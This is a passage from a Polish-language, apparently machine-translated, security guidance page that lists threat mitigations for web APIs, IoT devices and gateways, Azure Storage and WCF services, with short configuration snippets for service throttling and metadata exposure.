    }
```

## <a name="encrypt-sections-of-web-apis-configuration-files-that-contain-sensitive-data"></a><a id="config-sensitive"></a>Szyfrowanie sekcji plików konfiguracyjnych interfejsu API sieci Web zawierających poufne dane

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Interfejs API sieci Web | 
| **Faza SDL**               | Wdrożenie |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Dokumentacja**              | [Jak: Szyfrowanie sekcji konfiguracji w ASP.NET 2.0 Za pomocą DPAPI](https://msdn.microsoft.com/library/ff647398.aspx), [Określanie dostawcy konfiguracji chronionej](https://msdn.microsoft.com/library/68ze1hb2.aspx), [Używanie usługi Azure Key Vault do ochrony wpisów tajnych aplikacji](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Kroki** | Pliki konfiguracyjne, takie jak Web.config, appsettings.json są często używane do przechowywania poufnych informacji, w tym nazw użytkowników, haseł, ciągów połączeń bazy danych i kluczy szyfrowania. Jeśli te informacje nie będą chronione, aplikacja jest narażona na osoby atakujące lub złośliwych użytkowników uzyskujących poufne informacje, takie jak nazwy użytkowników kont i hasła, nazwy baz danych i nazwy serwerów. Na podstawie typu wdrożenia (azure/on-prem) zaszyfruj poufne sekcje plików konfiguracyjnych przy użyciu dpapi lub usług, takich jak usługa Azure Key Vault. |

## <a name="ensure-that-all-admin-interfaces-are-secured-with-strong-credentials"></a><a id="admin-strong"></a>Upewnij się, że wszystkie interfejsy administratora są zabezpieczone silnymi poświadczeniami

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Urządzenie IoT | 
| **Faza SDL**               | Wdrożenie |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Dokumentacja**              | Nie dotyczy  |
| **Kroki** | Wszystkie interfejsy administracyjne, które udostępnia urządzenie lub brama pola powinny być zabezpieczone przy użyciu silnych poświadczeń. Ponadto wszelkie inne narażone interfejsy, takie jak WiFi, SSH, udziały plików, FTP powinny być zabezpieczone silnymi poświadczeniami. Nie należy używać domyślnych słabych haseł. |

## <a name="ensure-that-unknown-code-cannot-execute-on-devices"></a><a id="unknown-exe"></a>Upewnij się, że nieznany kod nie może wykonać na urządzeniach

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Urządzenie IoT | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Dokumentacja**              | [Włączanie bezpiecznego rozruchu i szyfrowania urządzeń w systemie Windows 10 IoT Core](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) |
| **Kroki** | UEFI Secure Boot ogranicza system do zezwalania tylko na wykonywanie plików binarnych podpisanych przez określony urząd. Ta funkcja zapobiega wykonywania nieznanego kodu na platformie i potencjalnie osłabia jej poziom zabezpieczeń. Włącz bezpieczny rozruch UEFI i ogranicz listę urzędów certyfikacji, które są zaufane do podpisywania kodu. Podpisz cały kod, który jest wdrażany na urządzeniu przy użyciu jednego z zaufanych urzędów. |

## <a name="encrypt-os-and-additional-partitions-of-iot-device-with-bit-locker"></a><a id="partition-iot"></a>Szyfruj system operacyjny i dodatkowe partycje urządzenia IoT za pomocą bit-lockera

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Urządzenie IoT | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Dokumentacja**              | Nie dotyczy  |
| **Kroki** | System Windows 10 IoT Core implementuje lekką wersję szyfrowania urządzeń z szafką bitową, która ma silną zależność od obecności modułu TPM na platformie, w tym niezbędnego protokołu preOS w UEFI, który przeprowadza niezbędne pomiary. Te pomiary preOS zapewniają, że system operacyjny później ma ostateczny zapis, w jaki sposób system operacyjny został uruchomiony. Szyfruj partycje systemu operacyjnego przy użyciu bit-locker i wszelkie dodatkowe partycje również w przypadku przechowywania poufnych danych. |

## <a name="ensure-that-only-the-minimum-servicesfeatures-are-enabled-on-devices"></a><a id="min-enable"></a>Upewnij się, że tylko minimalne usługi/funkcje są włączone na urządzeniach

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Urządzenie IoT | 
| **Faza SDL**               | Wdrożenie |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Dokumentacja**              | Nie dotyczy  |
| **Kroki** | Nie należy włączać ani wyłączać żadnych funkcji lub usług w os, które nie są wymagane do działania rozwiązania. Na przykład jeśli urządzenie nie wymaga interfejsu użytkownika do wdrożenia, zainstaluj system Windows IoT Core w trybie bezgłowym. |

## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>Szyfruj system operacyjny i dodatkowe partycje bramy pola IoT za pomocą bit-lockera

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Brama pola IoT | 
| **Faza SDL**               | Wdrożenie |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Dokumentacja**              | Nie dotyczy  |
| **Kroki** | System Windows 10 IoT Core implementuje lekką wersję szyfrowania urządzeń z szafką bitową, która ma silną zależność od obecności modułu TPM na platformie, w tym niezbędnego protokołu preOS w UEFI, który przeprowadza niezbędne pomiary. Te pomiary preOS zapewniają, że system operacyjny później ma ostateczny zapis, w jaki sposób system operacyjny został uruchomiony. Szyfruj partycje systemu operacyjnego przy użyciu bit-locker i wszelkie dodatkowe partycje również w przypadku przechowywania poufnych danych. |

## <a name="ensure-that-the-default-login-credentials-of-the-field-gateway-are-changed-during-installation"></a><a id="default-change"></a>Upewnij się, że domyślne dane logowania bramy polowej zostały zmienione podczas instalacji

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Brama pola IoT | 
| **Faza SDL**               | Wdrożenie |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Dokumentacja**              | Nie dotyczy  |
| **Kroki** | Upewnij się, że domyślne dane logowania bramy polowej zostały zmienione podczas instalacji |

## <a name="ensure-that-the-cloud-gateway-implements-a-process-to-keep-the-connected-devices-firmware-up-to-date"></a><a id="cloud-firmware"></a>Upewnij się, że usługa Cloud Gateway implementuje proces, aby oprogramowanie układowe podłączonych urządzeń było aktualne

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Brama w chmurze IoT | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Wybór bramy — usługa Azure IoT Hub |
| **Dokumentacja**              | [Omówienie zarządzania urządzeniami w centrum IoT](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [Jak zaktualizować oprogramowanie układowe urządzenia](../../iot-hub/tutorial-firmware-update.md) |
| **Kroki** | LWM2M to protokół z Open Mobile Alliance for IoT Device Management. Zarządzanie urządzeniami Usługi Azure IoT umożliwia interakcję z urządzeniami fizycznymi przy użyciu zadań urządzenia. Upewnij się, że brama w chmurze implementuje proces rutynowego przechowywania danych urządzenia i innych danych konfiguracji przy użyciu usługi Azure IoT Hub Device Management. |

## <a name="ensure-that-devices-have-end-point-security-controls-configured-as-per-organizational-policies"></a><a id="controls-policies"></a>Upewnij się, że urządzenia mają skonfigurowane mechanizmy kontroli zabezpieczeń punktu końcowego zgodnie z zasadami organizacyjnymi

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Granica zaufania maszyny | 
| **Faza SDL**               | Wdrożenie |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Dokumentacja**              | Nie dotyczy  |
| **Kroki** | Upewnij się, że urządzenia mają kontrolki zabezpieczeń punktu końcowego, takie jak bit-locker do szyfrowania na poziomie dysku, program antywirusowy ze zaktualizowanymi podpisami, zapora oparta na hoście, uaktualnienia systemu operacyjnego, zasady grupy itp. |

## <a name="ensure-secure-management-of-azure-storage-access-keys"></a><a id="secure-keys"></a>Zapewnienie bezpiecznego zarządzania kluczami dostępu do magazynu platformy Azure

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Azure Storage | 
| **Faza SDL**               | Wdrożenie |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Dokumentacja**              | [Przewodnik po zabezpieczeniach usługi Azure Storage — zarządzanie kluczami kont magazynu](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Kroki** | <p>Magazyn kluczy: Zaleca się przechowywanie kluczy dostępu usługi Azure Storage w usłudze Azure Key Vault jako klucz tajny i pobieranie klucza przez aplikacje z magazynu kluczy. Jest to zalecane ze względu na następujące powody:</p><ul><li>Aplikacja nigdy nie będzie mieć klucza pamięci masowej zakodowane na stałe w pliku konfiguracyjnym, który usuwa tę aleję kogoś uzyskując dostęp do kluczy bez określonego zezwolenia</li><li>Dostęp do kluczy można kontrolować za pomocą usługi Azure Active Directory. Oznacza to, że właściciel konta może udzielić dostępu do kilku aplikacji, które muszą pobrać klucze z usługi Azure Key Vault. Inne aplikacje nie będą mogły uzyskać dostępu do kluczy bez udzielenia im uprawnień</li><li>Regeneracja kluczy: Zaleca się przeprowadzenie procesu w celu ponownego wygenerowanie kluczy dostępu do magazynu platformy Azure ze względów bezpieczeństwa. Szczegółowe informacje na temat tego, dlaczego i jak zaplanować regenerację kluczy, są udokumentowane w artykule referencyjnym przewodnika o zabezpieczeniach usługi Azure Storage</li></ul>|

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-azure-storage"></a><a id="cors-storage"></a>Upewnij się, że tylko zaufane źródła są dozwolone, jeśli usługa CORS jest włączona w magazynie platformy Azure

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Azure Storage | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Dokumentacja**              | [Pomoc techniczna dotycząca mechanizmu CORS dla usług Azure Storage](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Kroki** | Usługa Azure Storage umożliwia włączenie usługi CORS — cross origin Resource Sharing. Dla każdego konta magazynu można określić domeny, które mogą uzyskiwać dostęp do zasobów na tym koncie magazynu. Domyślnie cors jest wyłączona we wszystkich usługach. Można włączyć cors przy użyciu interfejsu API REST lub biblioteki klienta magazynu do wywołania jednej z metod, aby ustawić zasady usługi. |

## <a name="enable-wcfs-service-throttling-feature"></a><a id="throttling"></a>Włącz funkcję ograniczania przepustowości usług WCF

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | WCF | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | .NET Framework 3 |
| **Atrybuty**              | Nie dotyczy  |
| **Dokumentacja**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Wzmacnianie Królestwa](https://vulncat.fortify.com) |
| **Kroki** | <p>Nieumieszczenie limitu wykorzystania zasobów systemowych może spowodować wyczerpanie zasobów i ostatecznie odmowę usługi.</p><ul><li>**WYJAŚNIENIE:** Windows Communication Foundation (WCF) oferuje możliwość ograniczania żądań usługi. Zezwalanie na zbyt wiele żądań klientów może zalać system i wyczerpać jego zasoby. Z drugiej strony zezwolenie tylko niewielkiej liczby żądań do usługi może uniemożliwić legalnym użytkownikom korzystanie z usługi. Każda usługa powinna być indywidualnie dostrojona i skonfigurowana tak, aby zezwalała na odpowiednią ilość zasobów.</li><li>**ZALECENIA** Włącz funkcję ograniczania przepustowości usługi WCF i ustaw limity odpowiednie dla danej aplikacji.</li></ul>|

### <a name="example"></a>Przykład
Poniżej przedstawiono przykładową konfigurację z włączoną dławiecą:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a name="wcf-information-disclosure-through-metadata"></a><a id="info-metadata"></a>WCF-Ujawnienie informacji za pośrednictwem metadanych

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | WCF | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | .NET Framework 3 |
| **Atrybuty**              | Nie dotyczy  |
| **Dokumentacja**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Wzmacnianie Królestwa](https://vulncat.fortify.com) |
| **Kroki** | Metadane mogą pomóc atakującym dowiedzieć się o systemie i zaplanować formę ataku. Usługi WCF można skonfigurować w celu udostępnienia metadanych. Metadane zawiera szczegółowe informacje o opisie usługi i nie powinny być emitowane w środowiskach produkcyjnych. `HttpGetEnabled`  /  Właściwości `HttpsGetEnabled` ServiceMetaData klasy określa, czy usługa będzie uwidaczniać metadane | 

### <a name="example"></a>Przykład
Poniższy kod nakazuje WCF emitowanie metadanych usługi
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Nie emituj metadanych usługi w środowisku produkcyjnym. Ustaw właściwości HttpGetEnabled / HttpsGetEnabled klasy ServiceMetaData na false. 

### <a name="example"></a>Przykład
Poniższy kod nakazuje WCF, aby nie emitować metadanych usługi. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
